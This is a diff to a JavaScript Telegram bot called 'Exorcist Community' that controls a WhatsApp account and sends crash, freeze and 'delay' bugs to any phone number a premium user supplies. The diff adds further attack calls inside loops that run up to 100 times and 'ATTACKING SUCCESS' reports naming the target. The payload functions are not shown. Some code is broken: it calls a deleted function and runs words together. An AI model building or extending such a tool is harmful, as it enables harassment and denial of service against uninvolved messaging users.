@@ -85,6 +85,10 @@ const moment = require('moment-timezone');
 const { BOT_TOKEN, allowedDevelopers } = require("./TokenId/config");
 const crypto = require('crypto');
 const ZeppImg = fs.readFileSync('./k.jpg');
+
+const randomImages = [
+    "https://files.catbox.moe/w8mepp.png"
+];
 // --- Inisialisasi Bot Telegram ---
 const bot = new Telegraf(BOT_TOKEN);
 
@@ -151,12 +155,36 @@ AKSES DITOLAK
   return true;
 }
 
+  console.log(chalk.green(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
+⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
+⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
+⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
+⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
+⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
+  startBot();
+
 function startBot() {
   console.log(chalk.bold.red(`
 » Information:
 ☇ Developer : Ryanzz
 ☇ Script    : Exorcist Community
-☇ Version   : 2.0
+☇ Version   : 2.5
 `));
 }
 
@@ -324,11 +352,6 @@ const addDeviceToList = (userId, token) => {
         token: token
     });
     saveDeviceList();
-    console.log(chalk.white.bold(`
-┏─────────────────
-┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
-┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
-┗─────────────────`));
 };
 
 // --- Fungsi untuk Mencatat Aktivitas Pengguna ---
@@ -449,17 +472,7 @@ const startSesi = async () => {
     });
 }
 
-(async () => {
-    console.log(chalk.whiteBright.bold(`
-┏─────────────────
-┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
-┗─────────────────`));
-
-    console.log(chalk.white.bold(`
-┏━━━━━━─────────────────
-┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
-┗━━━━━━─────────────────`));
-
+(async () => {    
     loadPremiumUsers();
     loadAdmins();
     loadDeviceList();
@@ -795,7 +808,7 @@ Total Pengguna: ${Object.keys(userActivity).length}
 const prosesrespone = async (target, ctx) => {
   
     const ProsesColi = `
-✦━━〔 EXORCIST COMMUNITY ━━✦
+<blockquote><pre>✦━━〔 EXORCIST COMMUNITY ━━✦
 
 ☠ 𝗦𝗧𝗔𝗧𝗨𝗦
 ↳ Bug telah berhasil dikirim ke target ritual
@@ -807,38 +820,12 @@ const prosesrespone = async (target, ctx) => {
 ⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
 ↳ Oleh entitas gelap: EXO 🕷️
 
-✦━━━━━━━━━━━━━━━━━━━━━✦  `;
+✦━━━━━━━━━━━━━━━━━━━━━✦</pre></blockquote>  `;
 
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: ProsesColi,
       parse_mode: "HTML"
     })
-};
-
-const donerespone = async (target, ctx) => {
-  
-    const SuksesCrot = `
-✦━━〔 EXORCIST COMMUNITY ━━✦
-
-☠ 𝗦𝗧𝗔𝗧𝗨𝗦
-↳ Bug telah berhasil dikirim ke target ritual
-
-🩸 𝗡𝗢𝗧𝗘
-↳ Tunggu ±5 menit sebelum pengiriman ulang
-↳ Biarkan entitas pengirim tetap tersembunyi
-
-⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
-↳ Oleh entitas gelap: EXO 🕷️
-
-✦━━━━━━━━━━━━━━━━━━━━━✦
-    `;
-
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
-      caption: SuksesCrot,
-      parse_mode: "HTML", 
-      replyMarkup =
-       { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "bugmenux" }]]
-    });
 };
 
 const checkWhatsAppconnection = async (ctx, next) => {
@@ -878,6 +865,7 @@ bot.use(checkMaintenance); // Middleware untuk mengecek maintenance
 // --- Command /crash (Placeholder for your actual crash functions) ---
 bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -885,18 +873,29 @@ bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 100; i++) {
       await despiczy(target);
       await TrueNullv3(target);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 
 bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -904,7 +903,7 @@ bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
       await HxDZiaoXang(target);
@@ -919,11 +918,22 @@ bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
       await sleep(1000) 
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 
 bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -931,18 +941,29 @@ bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
      for (let i = 0; i < 100; i++) {
      await Truenullv4(target, ptcp = true);
      await XStromBulldozerX(target, true);
      }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 
 bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -950,7 +971,7 @@ bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 10; i++) {
       await Crash(target, true);
@@ -959,13 +980,32 @@ bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
       await sleep(1000);
       await nullExc(target, true);
       await sleep(1000);
+      await Nullvisible2(target)
+      await sleep(1000);
+      await CrashButton(target)
+      await sleep(1000);
+      awaitoneAmountV5(target) 
+      await sleep(1000);
+      awaitR9X(target)
+      await sleep(1000);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 
 bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -973,7 +1013,7 @@ bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 35; i++) {
       await nullExc(target, true);
@@ -982,11 +1022,21 @@ bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
       await Crash(target, true)
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -994,7 +1044,7 @@ bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
      await tesfang(target);
@@ -1003,13 +1053,29 @@ bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
               await sleep(1000);
               await buttonDelay(target);
               await sleep(1000);
+              await sxppoaatXExploter(target);
+              await sleep(1000);
+              await Mosquito(target);
+              await sleep(1000);
+              await DelayCarousel(target);
+              await sleep(1000);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
               const delay = (ms) => new Promise(res => setTimeout(res, ms));
               const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
 
@@ -1019,7 +1085,7 @@ bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
       await delayvisibSpam(target, true);
@@ -1030,11 +1096,21 @@ bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
       await SlowDelay();
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("viora", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -1042,7 +1118,7 @@ bot.command("viora", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
      await XvZDonger(target);
@@ -1055,11 +1131,21 @@ bot.command("viora", checkWhatsAppconnection, checkPremium, async ctx => {
               await sleep(1000);           
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("ultimate", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -1067,7 +1153,7 @@ bot.command("ultimate", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
      await packBlank(target);
@@ -1084,11 +1170,21 @@ bot.command("ultimate", checkWhatsAppconnection, checkPremium, async ctx => {
               await sleep(1000);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("ultimatum", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -1096,7 +1192,7 @@ bot.command("ultimatum", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
      await Notifcrash(target);
@@ -1117,19 +1213,28 @@ bot.command("ultimatum", checkWhatsAppconnection, checkPremium, async ctx => {
               await sleep(1000);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
-
 bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
     }
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-
-    await prosesrespone(target, ctx);
+let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 50; i++) {
       await TrueIos(target);
@@ -1140,11 +1245,22 @@ bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
       await rpnm(target);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 //Fungsi Untuk Menghapus Bug
 bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
     const q = ctx.message.text.split(" ")[1];
+             const userId = ctx.from.id;
 
     if (!q) {
         return await ctx.reply(`Example: commandnya 62×××`);
@@ -1152,7 +1268,7 @@ bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
 
     let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
-    await prosesrespone(target, ctx);
+    let Prosessock = await ctx.reply(`PROCESS...🚀🚀🚀`);
 
     for (let i = 0; i < 1; i++) {
       await deleteSentBugs(target);
@@ -1164,7 +1280,17 @@ bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
       await deleteSentBugs(target);
     }
 
-    await donerespone(target, ctx);
+    await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        Prosessock.message_id,
+        undefined, `
+┏━━━━━━━━━━━━━━━━━━━━━━━❍
+┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+┃
+┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
+┗━━━━━━━━━━━━━━━━━━━━━━━❍`);
+   await donerespone(target, ctx);
 });
 
 
@@ -1427,40 +1553,33 @@ startSesi();
 bot.start(async (ctx) => {
   // Mengirim status "mengetik"
   await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
-
+  
   // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
   const isPremium = isPremiumUser(ctx.from.id);
   const isAdminStatus = isAdmin(ctx.from.id);
   const isOwnerStatus = isOwner(ctx.from.id);
 
   const mainMenuMessage = 
-`<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
-║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
-║ ⚝ ᴅᴇᴠ      : @Putxzyy
-║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
-║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
+`<blockquote><pre>╔══✠『 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 』✠══╗
+║ 𖤻 ɴᴀᴍᴇ     : Exorcist Community
+║ 𖤻 ᴅᴇᴠ      : @Putxzyy
+║ 𖤻 ᴠᴇʀꜱɪᴏɴ  : 2.5
+║ 𖤻 ʟɪʙʀᴀʀʏ  : JavaScript
 ╚═════════════════════╝
 </pre></blockquote>
 `;
 
   const mainKeyboard = [
-    [{
-      text: "Ошибки меню",
-      callback_data: "bugmenux"
-    }],
-      [{
-      text: "Меню настроек",
-      callback_data: "settingcmd"
-    }],
-      [{
-      text: "Меню владельца",
-      callback_data: "ownermenu"
-    }],
+    [{    text: "[ 🛠 ]バグメニュー", callback_data: "ownermenu"},
+     {    text: "[ 🧬 ]バグメニュー", callback_data: "bugmenux"}],
+    [{    text: "[ 📡 ]設定メニュー", callback_data: "settingcmd"}],
+    [{    text: "[ 🔮 ]ファンメニュー", callback_data: "funmenu"}],
+    [{    text: "[ 🪧 ]", url: "https://t.me/Putxzyy"}]
   ];
 
   // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: mainMenuMessage,
       parse_mode: "HTML",
       reply_markup: {
@@ -1480,10 +1599,10 @@ bot.action('bugmenux', async (ctx) => {
   }
 
   const mainMenuMessage = 
-`<blockquote><pre>┏━━━༺ 𖤐 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𖤐 ༻━┓
+`<blockquote><pre>┏━━━༺ 𖤐 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 𖤐 ༻━┓
 ┃ ✠ Nᴀᴍᴇ      : Exorcist Community
 ┃ ✠ Dᴇᴠᴇʟᴏᴘᴇʀ : @Putxzyy
-┃ ✠ Vᴇʀsɪᴏɴ   : 2.0
+┃ ✠ Vᴇʀsɪᴏɴ   : 2.5
 ┃ ✠ Lɪʙʀᴀʀʏ   : ᴊᴀᴠᴀsᴄʀɪᴘᴛ 
 ┗━━━━━━━━━━━━━━━━━━━━━━━┛
 
@@ -1500,7 +1619,7 @@ bot.action('bugmenux', async (ctx) => {
 ┃ ▷ /rimuru 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟸
 ┃ ▷ /viora 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟷
 ┃ ▷ /ultimate 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟸
-┃ ▷ /ultimatum 62xx
+┃ ▷ /ultimatum 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝚄𝙸
 ┃ ▷ /vasion 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙾𝚂
 ┗━━━━━━━━━━━━━━━━━━━━━━━┛
 
@@ -1512,20 +1631,20 @@ bot.action('bugmenux', async (ctx) => {
 </pre></blockquote>
 `;
 
-  const mainKeyboard = [
+const mainKeyboard = [
     [{
-      text: "🔙",
+      text: "⌫",
       callback_data: "main_menu"
   }],
     [{
-    text: "🇷🇺",
+    text: "🪧",
     url: "https://t.me/Putxzyy"
     }]
   ];
 
   // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: mainMenuMessage,
       parse_mode: "HTML",
       reply_markup: {
@@ -1545,10 +1664,10 @@ bot.action('settingcmd', async (ctx) => {
   }
 
   const mainMenuMessage = 
-`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
+`<blockquote><pre>┌─〔 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 〕─┐
 │ Name      : Exorcist Community
 │ Developer : @Putxzyy
-│ Version   : 2.0 (Latest)
+│ Version   : 2.5
 │ Library   : JavaScript
 └──────────────────────┘
 
@@ -1563,18 +1682,18 @@ bot.action('settingcmd', async (ctx) => {
 
   const mainKeyboard = [
     [{
-      text: "🔙",
+      text: "⌫",
       callback_data: "main_menu"
   }],
     [{
-    text: "🇷🇺",
+    text: "🪧",
     url: "https://t.me/Putxzyy"
     }]
   ];
 
   // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
